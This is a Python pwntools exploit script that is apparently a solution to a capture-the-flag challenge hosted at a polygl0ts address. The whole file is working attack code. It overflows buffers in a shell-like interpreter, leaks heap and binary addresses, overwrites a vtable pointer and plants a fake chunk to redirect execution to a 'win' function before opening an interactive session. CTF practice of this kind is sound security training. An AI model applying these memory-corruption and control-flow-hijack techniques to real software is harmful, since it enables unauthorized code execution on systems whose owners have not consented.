#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("chall.polygl0ts.ch", 9034)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """, env={"LD_LIBRARY_PATH" : "."})
        else:
            io = process([exe.path], env={"LD_LIBRARY_PATH" : "."})
            #gdb.attach(io)
    return io


def main():
    io = conn()
    io.sendlineafter(b">", b"$AAAA=0")
    io.sendlineafter(b"> ", b"log")
    io.sendlineafter(b"> ", b"$BBBB=CCCC")
    payload = b"@" * (4+0x18)
    io.sendlineafter(b"> ", payload)
    io.sendlineafter(b"> ", b"$(($AAAA+$BBBB))")
    heap_leak = int(io.recvline())
    heap_base = heap_leak-0x133a0
    info(f"heap_leak: {hex(heap_leak)}")
    
    io.sendlineafter(b"> ", b"log")
    io.sendlineafter(b"> ", b"$DDDD=EEEE")
    vtable_addr = heap_base + 78792
    payload = b"@" * (4+0x18+8) + p64(vtable_addr)
    io.sendlineafter(b"> ", payload)
    io.sendlineafter(b"> ", b"$(($DDDD+$BBBB))")
    io.recvuntil(B"DDDD: ")
    binary_leak = u64(io.recv(6).ljust(8, b"\x00"))
    info(f"binary_leak: {hex(binary_leak)}")
    exe.address = binary_leak-37512
    info(f"exe.address: {hex(exe.address)}")
    io.sendlineafter(b"> ", b"log")
    io.sendlineafter(b"> ", b"$FFFF=1234")
    
    payload = (4+16) * b"!" + p64(heap_base+79199)
    io.sendlineafter(b"> ", payload)
    
    io.sendlineafter(b"> ", b"log")
    win = exe.address + 11693
    fake_chunk = b"CHUJCHUJ" + p64(win)
    io.sendlineafter(b"> ", fake_chunk)


    
    
    
    
    io.interactive()


if __name__ == "__main__":
    main()
